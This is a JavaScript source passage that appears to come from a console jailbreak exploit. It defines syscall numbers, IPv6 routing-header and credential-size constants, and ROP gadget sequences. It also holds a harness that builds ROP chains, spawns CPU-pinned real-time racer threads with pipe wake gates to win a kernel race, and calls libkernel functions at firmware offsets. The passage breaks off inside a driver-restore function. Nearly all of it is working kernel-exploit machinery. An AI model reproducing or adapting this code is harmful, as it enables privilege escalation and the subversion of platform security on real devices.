// @egycnq (I rewrote egys impli of poops but 90% of his code is likely still factored in)

export const ERRNO = {
  1: "EPERM",
  2: "ENOENT",
  3: "ESRCH",
  4: "EINTR",
  5: "EIO",
  6: "ENXIO",
  7: "E2BIG",
  8: "ENOEXEC",
  9: "EBADF",
  10: "ECHILD",
  11: "EDEADLK",
  12: "ENOMEM",
  13: "EACCES",
  14: "EFAULT",
  15: "ENOTBLK",
  16: "EBUSY",
  17: "EEXIST",
  18: "EXDEV",
  19: "ENODEV",
  20: "ENOTDIR",
  21: "EISDIR",
  22: "EINVAL",
  23: "ENFILE",
  24: "EMFILE",
  25: "ENOTTY",
  26: "ETXTBSY",
  27: "EFBIG",
  28: "ENOSPC",
  29: "ESPIPE",
  30: "EROFS",
  31: "EMLINK",
  32: "EPIPE",
  33: "EDOM",
  34: "ERANGE",
  35: "EAGAIN",
  36: "EINPROGRESS",
  37: "EALREADY",
  38: "ENOTSOCK",
  39: "EDESTADDRREQ",
  40: "EMSGSIZE",
  41: "EPROTOTYPE",
  42: "ENOPROTOOPT",
  43: "EPROTONOSUPPORT",
  44: "ESOCKTNOSUPPORT",
  45: "EOPNOTSUPP",
  46: "EPFNOSUPPORT",
  47: "EAFNOSUPPORT",
  48: "EADDRINUSE",
  49: "EADDRNOTAVAIL",
  50: "ENETDOWN",
  51: "ENETUNREACH",
  52: "ENETRESET",
  53: "ECONNABORTED",
  54: "ECONNRESET",
  55: "ENOBUFS",
  56: "EISCONN",
  57: "ENOTCONN",
  58: "ESHUTDOWN",
  59: "ETOOMANYREFS",
  60: "ETIMEDOUT",
  61: "ECONNREFUSED",
  62: "ELOOP",
  63: "ENAMETOOLONG",
  65: "EHOSTUNREACH",
  66: "ENOTEMPTY",
  69: "EDQUOT",
  78: "ENOSYS",
  84: "EOVERFLOW",
  89: "ECAPMODE",
  90: "ENOTCAPABLE",
  91: "EINTEGRITY",
};

export const K = {
  AF_UNIX: 1,
  AF_INET: 2,
  AF_INET6: 28,
  SOCK_STREAM: 1,
  SOCK_DGRAM: 2,
  IPPROTO_IPV6: 41,

  SOL_SOCKET: 0xffff,
  SO_SNDBUF: 0x1001,
  IPV6_RTHDR: 51,
  IPV6_RTHDR_TYPE_0: 0,

  RTHDR_TAG: 0x13370000,

  UCRED_SIZE: 0x168,

  IOV_SIZE: 0x10,
  MSG_IOV_NUM: 0x17,
  UIO_IOV_NUM: 0x14,

  F_GETFL: 3,
  F_SETFL: 4,
  O_NONBLOCK: 4,
  O_RDONLY: 0,

  SEEK_SET: 0,
  SEEK_END: 2,

  FIOSETOWN: 0x8004667c,

  PROT_READ: 0x1,
  PROT_WRITE: 0x2,
  MAP_PRIVATE: 0x2,
  MAP_ANONYMOUS: 0x1000,

  CPU_LEVEL_WHICH: 3,
  CPU_WHICH_TID: 1,
  CPUSET_SIZE: 0x10,
  RTP_LOOKUP: 0,
  RTP_SET: 1,

  UMTX_OP_WAIT: 2,
  UMTX_OP_WAKE: 3,

  AMD64_GET_FSBASE: 128,

  MSG_DONTWAIT: 0x80,
};

const SK = K;

export const BANNED = {
  0x02a: "sys_compat10.pipe -- legacy ABI, returns fd1 in RDX",
};

export function buildRthdr(u8, off, size) {
  const len = ((size >> 3) - 1) & ~1;
  u8[off + 0] = 0;
  u8[off + 1] = len & 0xff;
  u8[off + 2] = K.IPV6_RTHDR_TYPE_0;
  u8[off + 3] = (len >> 1) & 0xff;
  return (len + 1) << 3;
}

export function w16(u8, o, v) {
  u8[o] = v & 0xff;
  u8[o + 1] = (v >>> 8) & 0xff;
}
export function w32(u8, o, v) {
  u8[o] = v & 0xff;
  u8[o + 1] = (v >>> 8) & 0xff;
  u8[o + 2] = (v >>> 16) & 0xff;
  u8[o + 3] = (v >>> 24) & 0xff;
}
export function r16(u8, o) {
  return (u8[o] | (u8[o + 1] << 8)) >>> 0;
}
export function r32(u8, o) {
  return (
    (u8[o] | (u8[o + 1] << 8) | (u8[o + 2] << 16) | (u8[o + 3] << 24)) >>> 0
  );
}

export function w64(u8, o, v) {
  if (v !== null && typeof v === "object") {
    w32(u8, o, v.low);
    w32(u8, o + 4, v.hi);
  } else {
    w32(u8, o, v >>> 0);
    w32(u8, o + 4, Math.floor(v / 0x100000000) >>> 0);
  }
}
export function coreList(mask) {
  const out = [];
  for (let i = 0; i < 32; ++i) if ((mask >>> i) & 1) out.push(i);
  return out.join(",");
}

export function hexBytes(u8, off, n) {
  let s = "";
  for (let i = 0; i < n; ++i)
    s += (i ? " " : "") + u8[off + i].toString(16).padStart(2, "0");
  return s;
}

export const TK = {
  CPU_LEVEL_WHICH: SK.CPU_LEVEL_WHICH,
  CPU_WHICH_TID: SK.CPU_WHICH_TID,
  CPUSET_SIZE: SK.CPUSET_SIZE,
  RTP_LOOKUP: SK.RTP_LOOKUP,
  RTP_SET: SK.RTP_SET,
  UMTX_OP_WAIT: SK.UMTX_OP_WAIT,
  UMTX_OP_WAKE: SK.UMTX_OP_WAKE,

  PRI_REALTIME: 2,
  PRI_TIMESHARE: 3,
  PRI_IDLE: 4,

  POOPS_RTPRIO: 256,

  NWAKE_ALL: 0x7fffffff,

  IOV_THREAD_NUM: 4,
  UIO_THREAD_NUM: 4,

  KPRIM_STANDIN_DEFAULT: 8,
  KPRIM_STANDIN_CAP: 32,

  ST_DEFAULT: 0,
  ST_READY: 1,
  ST_DONE: 2,
  ST_EXITED: 3,
};

export const SYS = {
  READ: 0x3,
  WRITE: 0x4,
  CLOSE: 0x6,
  GETPID: 0x14,
  SOCKET: 0x61,
  NANOSLEEP: 0xf0,
  SCHED_YIELD: 0x14b,
  THR_EXIT: 0x1af,
  THR_SELF: 0x1b0,
  THR_KILL: 0x1b1,
  UMTX_OP: 0x1c6,
  THR_NEW: 0x1c7,
  RTPRIO_THREAD: 0x1d2,
  CPUSET_GETAFFINITY: 0x1e7,
  CPUSET_SETAFFINITY: 0x1e8,
  PIPE2: 0x2af,
  THR_SUSPEND_UCONTEXT: 0x278,
  THR_RESUME_UCONTEXT: 0x279,
};

const THR_PARAM_SIZE = 0x68;

export function makeHarness(X) {
  const { P, chain, i64, sys, runChain, mem, flushMark, sleep, state, driver } =
    X;

  const queueEvent = X.queueEvent || flushMark;

  const track = typeof X.track === "function" ? X.track : () => {};
  const untrack = typeof X.untrack === "function" ? X.untrack : () => {};

  if (typeof state.wakeGates !== "number") state.wakeGates = 0;

  const M1 = () => i64(0xffffffff, 0xffffffff);

  function needStub(num, why) {
    if (P.syscalls[num] === undefined)
      throw new Error(
        "syscall 0x" +
          num.toString(16).toUpperCase() +
          " has no stub in the active firmware profile (rop.js:78): " +
          why,
      );
    return P.syscalls[num];
  }

  function needGadget(name, why) {
    const g = P.gadgets[name];
    if (g === undefined)
      throw new Error(
        "gadget '" +
          name +
          "' is not in the active firmware " +
          "gadget map (rop.js:78): " +
          why,
      );
    return g;
  }
  function needGadgets(names, why) {
    for (const n of names) needGadget(n, why);
  }

  const G_STORE = [
    "pop rdi",
    "pop rsi",
    "mov [rdi], rsi",
    "mov [rdi], rax",
    "mov [rdi], eax",
  ];

  const G_CALL = [
    "pop rdi",
    "pop rsi",
    "pop rdx",
    "pop rcx",
    "pop r8",
    "pop r9",
    "ret",
  ];

  const G_COPY = [
    "pop rax",
    "mov rax, [rax]",
    "pop rdi",
    "mov [rdi], rax",
    "pop rsi",
    "mov [rdi], rsi",
  ];

  const G_BRANCH = [
    "pop rcx",
    "pop rax",
    "cmp [rcx], eax",
    "sete al",
    "shl rax, 3",
    "add rax, rcx",
    "mov rax, [rax]",
    "pop rdi",
    "mov [rdi], rax",
    "pop rsp",
    "inc dword [rax]",
  ];

  function newSync(spec) {
    let n = 0;
    const map = Object.create(null);
    for (const [nm, c] of spec) {
      map[nm] = n;
      n += c;
    }
    const raw = P.malloc(0x80 + n * 8, 1);
    const pad = (64 - (raw.low & 63)) & 63;

    const base = i64(raw.low, raw.hi);
    base.add32inplace(pad);
    const u8 = raw.backing;
    const at = (nm, i) => pad + (map[nm] + (i || 0)) * 8;
    const S = {
      base,
      raw,
      pad,
      qwords: n,
      has: (nm) => map[nm] !== undefined,
      ptr: (nm, i) => base.add32((map[nm] + (i || 0)) * 8),
      get: (nm, i) => r32(u8, at(nm, i)) >>> 0,
      hi: (nm, i) => r32(u8, at(nm, i) + 4) >>> 0,
      s32: (nm, i) => r32(u8, at(nm, i)) | 0,
      hex: (nm, i) => {
        const h = r32(u8, at(nm, i) + 4),
          l = r32(u8, at(nm, i));
        return h === 0
          ? l.toString(16)
          : h.toString(16) + l.toString(16).padStart(8, "0");
      },
      set: (nm, i, v) => {
        w32(u8, at(nm, i), v >>> 0);
        w32(u8, at(nm, i) + 4, 0);
      },
      u8,
      at,
    };
    for (let k = 0; k < n * 8; ++k) u8[pad + k] = 0;
    state.syncBlocks++;
    state.syncBytes += 1000 + 0x80 + n * 8;
    return S;
  }

  const slotLo = (t, i) => t.stack_array[t.reserved_stack_index + i * 2] >>> 0;
  const slotHi = (t, i) =>
    t.stack_array[t.reserved_stack_index + i * 2 + 1] >>> 0;
  const slotAddr = (t, i) => t.stack_entry_point.add32(i * 8);

  function retargetSlot(t, idx, addr, label) {
    const cur = slotHi(t, idx);
    if (addr.hi >>> 0 === cur) {
      t.stack_array[t.reserved_stack_index + idx * 2] = addr.low >>> 0;
      return "atomic32";
    }
    state.tornWrites.push(label + "@slot" + idx);
    t.stack_array[t.reserved_stack_index + idx * 2 + 1] = addr.hi >>> 0;
    t.stack_array[t.reserved_stack_index + idx * 2] = addr.low >>> 0;
    return "two-store";
  }

  function setSlotU32(t, idx, v) {
    if (slotHi(t, idx) !== 0)
      t.stack_array[t.reserved_stack_index + idx * 2 + 1] = 0;
    t.stack_array[t.reserved_stack_index + idx * 2] = v >>> 0;
  }

  function maxSlots(t) {
    return (t.stack_size - t.reserved_stack) / 8;
  }
  function assertSlots(t, label) {
    const m = maxSlots(t);
    if (t.count >= m)
      throw new Error(
        "chain-slot overflow in '" +
          label +
          "': used " +
          t.count +
          " of " +
          m +
          " slots (stack_size 0x" +
          t.stack_size.toString(16) +
          ", reserved 0x" +
          t.reserved_stack.toString(16) +
          ")",
      );
    return { used: t.count, max: m, pct: Math.round((t.count * 100) / m) };
  }

  function newThread(name, stackSize, reservedStack) {
    const t = new thread_rop(
      P,
      chain,
      name,
      stackSize === undefined ? 0x2000 : stackSize,
      reservedStack === undefined ? 0x400 : reservedStack,
    );
    t.jbName = name;
    t.jbSpawned = false;
    t.jbTid = 0;

    state.threadObjectsBuilt++;
    state.heapBytes += 0x42800 + 5 * 0x40000;
    return t;
  }

  function queueSpawn(t, retSync, retName, retIdx) {
    needStub(SYS.THR_NEW, "spawning a ROP thread");
    chain.add_syscall_ret(
      retSync.ptr(retName, retIdx),
      SYS.THR_NEW,
      t.thr_new_args,
      THR_PARAM_SIZE,
    );
  }

  function readTid(t) {
    flushMark(
      "TID-PRE",
      t.jbName +
        "-tid=0x" +
        t.tid.toString() +
        "-ptid=0x" +
        t.ptid.toString() +
        "-next=read8x2",
    );
    const child = P.read8(t.tid);
    const parent = P.read8(t.ptid);
    const c = child.low >>> 0,
      pa = parent.low >>> 0;
    const tid = c || pa;
    flushMark(
      "TID",
      t.jbName + "-child=" + c + "-parent=" + pa + "-use=" + tid,
    );

    if (c !== 0 && pa !== 0 && c !== pa)
      throw new Error(
        "TID disagreement for " +
          t.jbName +
          ": thr_param+0x30 child_tid=" +
          c +
          " +0x38 " +
          "parent_tid=" +
          pa,
      );
    t.jbTid = tid;
    t.jbTidChild = child.low >>> 0;
    t.jbTidParent = parent.low >>> 0;
    return { tid, child: t.jbTidChild, parent: t.jbTidParent };
  }

  function emitPrologue(t, S, wid, core, prio, parts) {
    const doPin = !parts || parts.pin !== false;
    const doPrio = !parts || parts.prio !== false;
    if (doPin) {
      needStub(SYS.CPUSET_SETAFFINITY, "per-thread pinning");
      needStub(SYS.CPUSET_GETAFFINITY, "pin read-back");
    }
    if (doPrio) needStub(SYS.RTPRIO_THREAD, "per-thread RT priority");
    needGadgets(G_CALL, "the racer prologue's syscall arguments");
    needGadgets(G_STORE, "the racer prologue's result stores");

    const mask = mem(TK.CPUSET_SIZE);
    for (let i = 0; i < TK.CPUSET_SIZE; ++i) mask.u8[i] = 0;
    w32(mask.u8, 0, (1 << core) >>> 0);

    const rtp = mem(0x10);
    for (let i = 0; i < 0x10; ++i) rtp.u8[i] = 0;
    w16(rtp.u8, 0, TK.PRI_REALTIME);
    w16(rtp.u8, 2, prio);

    const rtpBack = mem(0x10);
    for (let i = 0; i < 0x10; ++i) rtpBack.u8[i] = 0;
    const maskBack = mem(TK.CPUSET_SIZE);
    for (let i = 0; i < TK.CPUSET_SIZE; ++i) maskBack.u8[i] = 0;

    if (doPin) {
      t.self_healing_syscall(
        SYS.CPUSET_SETAFFINITY,
        TK.CPU_LEVEL_WHICH,
        TK.CPU_WHICH_TID,
        M1(),
        TK.CPUSET_SIZE,
        mask.ptr,
      );
      t.write_result4(S.ptr("pinret", wid));
    }

    if (doPrio) {
      t.self_healing_syscall(SYS.RTPRIO_THREAD, TK.RTP_SET, 0, rtp.ptr);
      t.write_result4(S.ptr("prioret", wid));

      t.self_healing_syscall(SYS.RTPRIO_THREAD, TK.RTP_LOOKUP, 0, rtpBack.ptr);
      t.write_result4(S.ptr("lookupret", wid));
    }

    if (doPin) {
      t.self_healing_syscall(
        SYS.CPUSET_GETAFFINITY,
        TK.CPU_LEVEL_WHICH,
        TK.CPU_WHICH_TID,
        M1(),
        TK.CPUSET_SIZE,
        maskBack.ptr,
      );
      t.write_result4(S.ptr("affret", wid));
    }

    t.fcall(P.libKernelBase.add32(OFFSET_lk_sceKernelGetCurrentCpu));
    t.write_result(S.ptr("cpu", wid));

    t.push_write8(S.ptr("status", wid), TK.ST_READY);

    return { mask, rtp, rtpBack, maskBack };
  }

  function newWakeGate(label, i) {
    needStub(SYS.PIPE2, "the racer's blocking wake gate");
    const fdbuf = mem(8);
    w32(fdbuf.u8, 0, 0);
    w32(fdbuf.u8, 4, 0);
    return { fdbuf, label, i };
  }

  async function newWakeGates(n, label) {
    needStub(SYS.PIPE2, "the racer wake gates");
    const g0 = newWakeGate(label, 0);
    flushMark(
      "WAKEGATE-PRE",
      label +
        "-n=" +
        n +
        "-syscall=pipe2-0x2AF" +
        "-flags=0-BLOCKING-BOTH-ENDS-out=0x" +
        g0.fdbuf.ptr.toString(),
    );
    const out = [];
    for (let i = 0; i < n; ++i) {
      w32(g0.fdbuf.u8, 0, 0);
      w32(g0.fdbuf.u8, 4, 0);
      const r = await sys(SYS.PIPE2, g0.fdbuf.ptr, 0);
      if (r.failed)
        throw new Error(
          "pipe2 for wake gate " + label + "[" + i + "] failed: " + r.errText,
        );
      const rfd = r32(g0.fdbuf.u8, 0) | 0,
        wfd = r32(g0.fdbuf.u8, 4) | 0;
      if (rfd < 0 || wfd < 0)
        throw new Error(
          "pipe2 for wake gate " +
            label +
            "[" +
            i +
            "] returned 0 with fds " +
            rfd +
            "," +
            wfd,
        );

      const buf = mem(8);
      for (let k = 0; k < 8; ++k) buf.u8[k] = 0;
      out.push({ rfd, wfd, buf: buf.ptr, bufMem: buf });

      track(rfd);
      track(wfd);
      queueEvent("WAKEGATE", label + "-" + i + "-r=" + rfd + "-w=" + wfd);
      state.wakeGates++;
    }
    flushMark(
      "WAKEGATE-OK",
      label +
        "-n=" +
        n +
        "-r=" +
        out.map((o) => o.rfd).join(".") +
        "-w=" +
        out.map((o) => o.wfd).join("."),
    );
    return out;
  }

  function emitRacerLoop(t, S, wid, opt) {
    needStub(SYS.READ, "the racer's blocking wake gate");
    needStub(SYS.THR_EXIT, "the kill switch tail");
    needGadgets(G_CALL, "the racer loop's syscall arguments");
    needGadgets(G_STORE, "the racer loop's awake[]/finished[]/status stores");
    needGadgets(G_BRANCH, "the racer's read()-return gate");

    needGadget("pop rsp", "the rewritable pivot and the loop-back");

    const gate = opt.wake;
    if (
      !gate ||
      typeof gate.rfd !== "number" ||
      gate.rfd < 0 ||
      gate.buf === undefined
    )
      throw new Error(
        "emitRacerLoop(" +
          (opt.name || "racer" + wid) +
          "): opt.wake must be a live { rfd, wfd, buf } from " +
          "newWakeGates()",
      );

    const loopStart = t.get_rsp();

    t.self_healing_syscall(SYS.READ, gate.rfd, gate.buf, 1);
    t.write_result4(S.ptr("waitret", wid));

    const readGate = t.create_branch(
      t.branch_types.EQUAL,
      S.ptr("waitret", wid),
      1,
    );
    const gateMet = t.get_rsp();

    t.push_write8(S.ptr("awake", wid), 1);

    t.push(P.gadgets["pop rsp"]);
    const pivotIdx = t.count;
    t.push(0);

    const workStart = t.get_rsp();
    if (opt.work) opt.work(t);
    t.push_write8(S.ptr("finished", wid), 1);
    t.jmp_to_rsp(loopStart);

    const exitTail = t.get_rsp();
    t.push_write8(S.ptr("status", wid), TK.ST_EXITED);
    t.fcall(P.syscalls[SYS.THR_EXIT], 0);

    t.set_branch_points(readGate, gateMet, exitTail);

    t.set_entry(pivotIdx, workStart);

    return {
      loopStart,
      workStart,
      exitTail,
      pivotIdx,
      valIdx: -1,
      gate: readGate,
    };
  }

  function buildRacer(S, wid, opt) {
    const t = newThread(
      opt.name || "racer" + wid,
      opt.stackSize,
      opt.reservedStack,
    );
    const bufs = emitPrologue(t, S, wid, opt.core, opt.prio, opt.parts);
    const marks = emitRacerLoop(t, S, wid, opt);
    const budget = assertSlots(t, opt.name || "racer" + wid);
    t.jbMarks = marks;
    t.jbBufs = bufs;
    t.jbBudget = budget;
    t.jbWid = wid;
    t.jbSync = S;

    t.jbWakeRfd = opt.wake.rfd;
    t.jbWakeWfd = opt.wake.wfd;
    t.jbWakeBuf = opt.wake.buf;
    return t;
  }

  let signalMarksQuiet = false;

  function setSignalMarksQuiet(quiet) {
    const was = signalMarksQuiet;
    signalMarksQuiet = !!quiet;
    return was;
  }

  function signalMark(tag, extra) {
    if (signalMarksQuiet) queueEvent(tag, extra);
    else flushMark(tag, extra);
  }

  function wakeArgs(g) {
    return g.spawned.map((t) => {
      if (t.jbWakeWfd === undefined || t.jbWakeWfd < 0)
        throw new Error(
          "wakeArgs(" +
            g.name +
            "): " +
            t.jbName +
            " has no wake gate (jbWakeWfd=" +
            t.jbWakeWfd +
            ")",
        );
      return {
        fd: t.jbWakeWfd,
        buf: t.jbWakeBuf,
        len: 1,
        name: t.jbName,
        wid: t.jbWid,
      };
    });
  }

  function armSignal(g, why) {
    if (!g.settled)
      throw new Error(
        "signal(" + g.name + "): previous signal not " + "matched by wait()",
      );
    g.settled = false;
    g.gen++;

    for (const wid of g.wids) {
      g.S.set("awake", wid, 0);
      g.S.set("finished", wid, 0);
    }
    signalMark(
      "SIGNAL-PRE",
      g.name + "-round=" + g.gen + "-n=" + g.wids.length + "-why=" + why,
    );
    return wakeArgs(g);
  }
  function newGroup(name, threads, S, opt) {
    return {
      name,
      threads,
      S,

      spawned: threads.slice(),
      wids: threads.map((t) => t.jbWid),
      gen: 0,
      settled: true,
      terminated: false,
      opt: opt || {},
    };
  }

  async function signal(g, deadlineMs, why) {
    const args = armSignal(g, why);
    const t0 = Date.now();
    if (args.length) {
      needStub(SYS.WRITE, "the one-byte wake");

      if (!g.jbWakeRet || g.jbWakeRetN < args.length) {
        g.jbWakeRet = mem(8 * args.length);
        g.jbWakeRetN = args.length;
      }
      for (let i = 0; i < args.length; ++i) {
        w32(g.jbWakeRet.u8, i * 8, 0x7fffffff);
        w32(g.jbWakeRet.u8, i * 8 + 4, 0x7fffffff);
        chain.add_syscall_ret(
          g.jbWakeRet.ptr.add32(i * 8),
          SYS.WRITE,
          args[i].fd,
          args[i].buf,
          1,
        );
      }
      await runChain();
      for (let i = 0; i < args.length; ++i) {
        const r = r32(g.jbWakeRet.u8, i * 8) | 0;
        if (r !== 1) {
          flushMark(
            "SIGNAL-WRITE-FAILED",
            g.name +
              "-wid=" +
              args[i].wid +
              "-name=" +
              args[i].name +
              "-fd=" +
              args[i].fd +
              "-ret=" +
              r +
              "-round=" +
              g.gen +
              "-why=" +
              why,
          );
          throw new Error(
            "signal(" +
              g.name +
              "): write(fd " +
              args[i].fd +
              ", 1) for " +
              args[i].name +
              " returned " +
              r +
              ", not 1",
          );
        }
      }
    }
    const ms = Date.now() - t0;
    signalMark(
      "SIGNAL",
      g.name + "-round=" + g.gen + "-bytes=" + args.length + "-ms=" + ms,
    );

    return { wakes: args.length, bytes: args.length, ms, gen: g.gen };
  }

  async function closeWakeGates(g) {
    const fds = [];
    for (const t of g.spawned) {
      if (typeof t.jbWakeRfd === "number" && t.jbWakeRfd >= 0)
        fds.push([t, "r", t.jbWakeRfd]);
      if (typeof t.jbWakeWfd === "number" && t.jbWakeWfd >= 0)
        fds.push([t, "w", t.jbWakeWfd]);
    }
    if (!fds.length) return { closed: 0, failed: [] };
    needStub(SYS.CLOSE, "closing the racer wake gates");
    const ret = mem(8 * fds.length);
    for (let i = 0; i < fds.length; ++i) {
      w32(ret.u8, i * 8, 0x7fffffff);
      w32(ret.u8, i * 8 + 4, 0x7fffffff);
      chain.add_syscall_ret(ret.ptr.add32(i * 8), SYS.CLOSE, fds[i][2]);
    }
    await runChain();
    let closed = 0;
    const failed = [];
    for (let i = 0; i < fds.length; ++i) {
      const r = r32(ret.u8, i * 8) | 0;
      const [t, which, fd] = fds[i];
      if (r === 0) {
        closed++;
        if (which === "r") t.jbWakeRfd = -1;
        else t.jbWakeWfd = -1;

        untrack(fd);
      } else failed.push(t.jbName + ":" + which + fd + "=" + r);
    }

    state.wakeGates -= Math.floor(closed / 2);
    return { closed, failed };
  }

  async function waitFinished(g, deadlineMs, why) {
    const t0 = Date.now();
    for (;;) {
      let stuck = -1;
      for (const wid of g.wids)
        if (g.S.get("finished", wid) === 0) {
          stuck = wid;
          break;
        }
      if (stuck < 0) {
        g.settled = true;
        return Date.now() - t0;
      }
      if (Date.now() - t0 > deadlineMs) {
        flushMark(
          "WAIT-TIMEOUT",
          g.name +
            "-stuck=" +
            stuck +
            "-ms=" +
            (Date.now() - t0) +
            "-why=" +
            why,
        );
        throw new Error(
          "wait(" +
            g.name +
            "): racer " +
            stuck +
            "/" +
            g.wids.length +
            " never set finished within " +
            deadlineMs +
            " ms (" +
            why +
            ")",
        );
      }
      await sleep(1);
    }
  }

  async function waitStatus(g, want, deadlineMs, why) {
    const t0 = Date.now();
    for (;;) {
      let stuck = -1;
      for (const wid of g.wids)
        if (g.S.get("status", wid) !== want) {
          stuck = wid;
          break;
        }
      if (stuck < 0) return Date.now() - t0;
      if (Date.now() - t0 > deadlineMs) {
        flushMark(
          "STATUS-TIMEOUT",
          g.name +
            "-stuck=" +
            stuck +
            "-want=" +
            want +
            "-saw=" +
            g.S.get("status", stuck) +
            "-why=" +
            why,
        );
        throw new Error(
          "waitStatus(" +
            g.name +
            "): racer " +
            stuck +
            " status is " +
            g.S.get("status", stuck) +
            ", wanted " +
            want +
            ", after " +
            deadlineMs +
            " ms (" +
            why +
            ")",
        );
      }
      await sleep(1);
    }
  }

  async function terminate(g, why) {
    if (g.terminated) return { already: true };
    const pv = g.spawned.length
      ? "pivotSlot=" +
        g.spawned[0].jbMarks.pivotIdx +
        "-exitTail=0x" +
        g.spawned[0].jbMarks.exitTail.toString()
      : "no-live-thread";
    flushMark(
      "TERM-PRE",
      g.name +
        "-live=" +
        g.spawned.length +
        "-built=" +
        g.threads.length +
        "-" +
        pv +
        "-why=" +
        why,
    );
    const report = {
      unblocked: null,
      retarget: [],
      signal: null,
      exitedMs: -1,
      settledMs: 0,
    };

    if (g.opt.unblock) report.unblocked = await g.opt.unblock();

    for (const t of g.spawned)
      report.retarget.push(
        retargetSlot(
          t,
          t.jbMarks.pivotIdx,
          t.jbMarks.exitTail,
          g.name + ":" + t.jbName,
        ),
      );

    g.settled = true;
    report.signal = await signal(
      g,
      g.opt.signalDeadline || 5000,
      "terminate:" + why,
    );
    report.exitedMs = await waitStatus(
      g,
      TK.ST_EXITED,
      g.opt.exitDeadline || 15000,
      "terminate:" + why,
    );

    await sleep(50);
    report.settledMs = 50;
    g.terminated = true;
    for (const t of g.spawned) state.threadsExited++;

    try {
      report.gates = await closeWakeGates(g);
    } catch (e) {
      report.gates = {
        closed: 0,
        failed: ["threw: " + ((e && e.message) || e)],
      };
    }
    flushMark(
      "TERM-OK",
      g.name +
        "-exitedMs=" +
        report.exitedMs +
        "-bytes=" +
        report.signal.wakes +
        "-gatesClosed=" +
        (report.gates ? report.gates.closed : -1) +
        (report.gates && report.gates.failed.length
          ? "-gateCloseFailed=" + report.gates.failed.join(",")
          : ""),
    );
    return report;
  }

  function whoArg(tid) {
    return tid === undefined || tid === null || tid === -1 ? M1() : tid;
  }
  function whoTxt(tid) {
    return tid === undefined || tid === null || tid === -1
      ? "self"
      : String(tid);
  }

  async function readAffinity(label, tid) {
    const m = mem(TK.CPUSET_SIZE);
    for (let i = 0; i < TK.CPUSET_SIZE; ++i) m.u8[i] = 0;
    flushMark(
      "AFF-GET-PRE",
      label + "-who=" + whoTxt(tid) + "-buf=0x" + m.ptr.toString(),
    );
    const r = await sys(
      SYS.CPUSET_GETAFFINITY,
      TK.CPU_LEVEL_WHICH,
      TK.CPU_WHICH_TID,
      whoArg(tid),
      TK.CPUSET_SIZE,
      m.ptr,
    );
    const bytes = new Uint8Array(TK.CPUSET_SIZE);
    for (let i = 0; i < TK.CPUSET_SIZE; ++i) bytes[i] = m.u8[i];
    const word = r32(bytes, 0);
    flushMark(
      "AFF-GET",
      label +
        "-ret=" +
        r.s32 +
        "-mask=0x" +
        word.toString(16) +
        "-cores=" +
        coreList(word),
    );
    return { r, bytes, word, hex: hexBytes(bytes, 0, TK.CPUSET_SIZE) };
  }

  async function writeAffinityBytes(bytes, label, tid) {
    const m = mem(TK.CPUSET_SIZE);
    for (let i = 0; i < TK.CPUSET_SIZE; ++i) m.u8[i] = bytes[i];
    flushMark(
      "AFF-SET-PRE",
      label +
        "-who=" +
        whoTxt(tid) +
        "-mask=" +
        hexBytes(bytes, 0, 8) +
        "-buf=0x" +
        m.ptr.toString(),
    );
    const r = await sys(
      SYS.CPUSET_SETAFFINITY,
      TK.CPU_LEVEL_WHICH,
      TK.CPU_WHICH_TID,
      whoArg(tid),
      TK.CPUSET_SIZE,
      m.ptr,
    );
    flushMark("AFF-SET", label + "-ret=" + r.s32);
    return r;
  }

  async function pinDriver(core) {
    const bytes = new Uint8Array(TK.CPUSET_SIZE);
    w32(bytes, 0, (1 << core) >>> 0);
    return await writeAffinityBytes(bytes, "pin-core-" + core);
  }

  async function thrSelf(label) {
    needStub(SYS.THR_SELF, "the driver thread's own TID");
    const b = mem(0x10);
    for (let i = 0; i < 0x10; ++i) b.u8[i] = 0;
    flushMark(
      "THR-SELF-PRE",
      (label || "driver") + "-syscall=thr_self-0x1B0-buf=0x" + b.ptr.toString(),
    );
    const r = await sys(SYS.THR_SELF, b.ptr);
    const tid = r32(b.u8, 0) >>> 0;
    const hi = r32(b.u8, 4) >>> 0;
    flushMark(
      "THR-SELF",
      (label || "driver") + "-ret=" + r.s32 + "-tid=" + tid + "-hi=" + hi,
    );
    return { r, tid, hi };
  }

  async function readRtprio(label, tid) {
    const b = mem(0x10);
    for (let i = 0; i < 0x10; ++i) b.u8[i] = 0;

    const lwp = tid === undefined || tid === null || tid === -1 ? 0 : tid;
    flushMark(
      "RTP-GET-PRE",
      label + "-lwpid=" + lwp + "-buf=0x" + b.ptr.toString(),
    );
    const r = await sys(SYS.RTPRIO_THREAD, TK.RTP_LOOKUP, lwp, b.ptr);
    const type = r16(b.u8, 0),
      prio = r16(b.u8, 2);
    flushMark(
      "RTP-GET",
      label + "-ret=" + r.s32 + "-type=" + type + "-prio=" + prio,
    );
    return { r, type, prio };
  }

  async function writeRtprio(type, prio, label, tid) {
    const b = mem(0x10);
    for (let i = 0; i < 0x10; ++i) b.u8[i] = 0;
    w16(b.u8, 0, type);
    w16(b.u8, 2, prio);
    const lwp = tid === undefined || tid === null || tid === -1 ? 0 : tid;
    flushMark(
      "RTP-SET-PRE",
      label +
        "-lwpid=" +
        lwp +
        "-type=" +
        type +
        "-prio=" +
        prio +
        "-buf=0x" +
        b.ptr.toString(),
    );
    const r = await sys(SYS.RTPRIO_THREAD, TK.RTP_SET, lwp, b.ptr);
    flushMark("RTP-SET", label + "-ret=" + r.s32);
    return r;
  }

  async function driverCurrentCpu() {
    flushMark(
      "DRV-CPU-PRE",
      "fn=lk+0x" + OFFSET_lk_sceKernelGetCurrentCpu.toString(16),
    );
    const v = await chainCall(
      P.libKernelBase.add32(OFFSET_lk_sceKernelGetCurrentCpu),
    );
    flushMark("DRV-CPU", "cpu=" + (v & 0xffff));
    return v;
  }

  async function chainCall(rip, a, b, c, d, e, f) {
    const t0 = Date.now();
    chain.fcall(rip, a, b, c, d, e, f);
    chain.write_result4(chain.return_value);
    await runChain();
    state.roundTrips.push(Date.now() - t0);
    return P.read4(chain.return_value) | 0;
  }

  async function restoreDriver(why) {
    const out = {
      why,
      affRet: null,
      prioRet: null,
      affOk: false,
      prioOk: false,
      error: "",
    };
    try {
      const a = await writeAffinityBytes(
        driver.origMaskBytes,
        "restore:" + why,
      );
      out.affRet = a.s32;
      const back = await readAffinity("restore-check");
      out.affOk =
        !back.r.failed &&
        hexBytes(back.bytes, 0, TK.CPUSET_SIZE) === driver.origMaskHex;
      out.affSeen = hexBytes(back.bytes, 0, TK.CPUSET_SIZE);

      const pr = await writeRtprio(
        driver.origPrioType,
        driver.origPrio,
        "restore:" + why,
      );
      out.prioRet = pr.s32;
      const pb = await readRtprio("restore-check");
      out.prioOk =
        !pb.r.failed &&
        pb.type === driver.origPrioType &&
        pb.prio === driver.origPrio;
